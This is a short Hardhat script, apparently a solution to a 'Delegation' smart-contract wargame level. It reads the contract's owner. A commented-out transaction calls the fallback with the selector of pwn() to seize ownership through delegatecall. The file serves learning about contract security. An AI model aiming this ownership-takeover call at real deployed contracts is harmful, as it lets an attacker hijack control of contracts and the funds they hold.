
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {

  const Token = await hre.ethers.getContractFactory("Delegation");
  const attack = await Token.attach("0x7b0d48A6d639e753B32836FfE10701cec86c1d60");

  await attack.deployed();

  console.log("attack deployed to:", attack.address);

  const owner = await attack.owner()
  console.log(owner)
  
  // const signer = await ethers.provider.getSigner("0xA5fd3B0f21bf8D6E0Eb580B65c7fECCdA2DCd638")

  // const attackFallback = await signer.sendTransaction({
  //   from: "0xA5fd3B0f21bf8D6E0Eb580B65c7fECCdA2DCd638",
  //   to: "0x7b0d48A6d639e753B32836FfE10701cec86c1d60",
  //   data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000" // the bytes4(sha3("pwn()"))
  // })

  // console.log(attackFallback)
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
